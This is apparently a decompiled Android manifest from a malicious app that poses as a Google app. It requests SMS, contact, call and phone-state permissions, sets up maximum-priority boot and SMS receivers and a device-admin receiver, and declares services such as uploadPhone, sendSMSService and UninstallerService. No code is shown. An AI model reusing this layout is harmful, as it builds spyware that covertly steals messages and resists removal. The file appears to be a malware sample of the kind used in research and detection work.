<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" package="com.cn.googleapp" platformBuildVersionCode="19" platformBuildVersionName="4.4.2-1456859">
  <uses-permission android:name="android.permission.INTERNET"/>
  <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
  <uses-permission android:name="android.permission.MOUNT_FORMAT_FILESYSTEMS"/>
  <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
  <uses-permission android:name="android.permission.READ_CONTACTS"/>
  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
  <uses-permission android:name="android.permission.RECEIVE_SMS"/>
  <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
  <uses-permission android:name="android.permission.READ_SMS"/>
  <uses-permission android:name="android.permission.SEND_SMS"/>
  <uses-permission android:name="android.permission.CALL_PHONE"/>
  <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
  <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
  <uses-permission android:name="android.permission.GET_TASKS"/>
  <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
  <application android:theme="@7F070001" android:label="@7F060000" android:icon="@7F020000" android:name="com.sevice.utils.FnApp" android:debuggable="true">
    <activity android:label="@7F060000" android:name="com.example.myapp.MainActivity">
      <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
      </intent-filter>
    </activity>
    <activity android:name="com.example.myapp.GooglePlayActivity" android:screenOrientation="1"/>
    <receiver android:name="com.example.myapp.receiver.openActivityReceiver" android:enabled="true" android:exported="true">
      <intent-filter android:priority="2147483647">
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
        <category android:name="android.intent.category.LAUNCHER"/>
      </intent-filter>
    </receiver>
    <receiver android:name="com.example.myapp.receiver.SystemReceiver" android:enabled="true" android:exported="true">
      <intent-filter android:priority="2147483647">
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="android.intent.action.ACTION_SHUTDOWN"/>
        <action android:name="android.intent.action.USER_PRESENT"/>
      </intent-filter>
    </receiver>
    <receiver android:name="com.example.myapp.receiver.PhoneReciever" android:enabled="true" android:exported="true">
      <intent-filter android:priority="2147483647">
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="android.intent.action.ACTION_SHUTDOWN"/>
        <action android:name="android.intent.action.USER_PRESENT"/>
      </intent-filter>
    </receiver>
    <receiver android:name="com.example.myapp.MDAR" android:permission="android.permission.BIND_DEVICE_ADMIN">
      <meta-data android:name="android.app.device_admin" android:resource="@7F040001"/>
      <intent-filter>
        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
      </intent-filter>
    </receiver>
    <receiver android:name="com.example.myapp.receiver.BroadcastReceiverMgr">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="android.intent.action.PHONE_STATE"/>
        <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
      </intent-filter>
    </receiver>
    <service android:name="com.example.myapp.services.uploadPhone">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
    <service android:name="com.example.myapp.services.LastTime1Service">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
    <service android:name="com.example.myapp.services.LastTimeService">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
    <service android:name="com.example.myapp.services.PhoneService">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
    <service android:name="com.example.myapp.services.sendSMSService">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
    <service android:name="com.example.myapp.services.SoftService">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
    <service android:name="com.example.myapp.services.UninstallerService">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
    <service android:name="com.example.myapp.services.KahaoService">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
      </intent-filter>
    </service>
  </application>
</manifest>
